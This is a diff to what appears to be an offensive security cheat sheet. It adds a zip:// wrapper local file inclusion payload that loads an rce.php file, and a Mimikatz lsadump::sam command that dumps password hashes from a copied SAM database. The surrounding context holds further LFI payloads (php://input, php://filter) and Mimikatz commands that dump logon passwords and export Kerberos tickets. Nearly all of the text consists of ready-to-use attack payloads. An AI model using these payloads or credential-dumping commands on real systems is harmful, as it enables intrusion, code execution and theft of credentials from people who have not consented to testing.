@@ -574,6 +574,9 @@ Login failed!"`
 ## using php stream php://input 
 - `?file=php://input`  
 
+## using zip wrapper zip://input 
+- `?file=zip://path/file.zip%23rce.php`
+
 ## specify your payload in the post parameters
 ### using php stream php://filter
 - `?file=php://filter/convert.base64-encode/resource=index.php`
@@ -741,6 +744,9 @@ Login failed!"`
 
 ## dump passwords from memory
 - `sekurlsa::logonpasswords`
+
+## dump passwords from sam database
+- `lsadump::sam /system:f:\SYSTEM /sam:f:\SAM`
 
 ## export tickets
 - `sekurlsa::tickets /export`
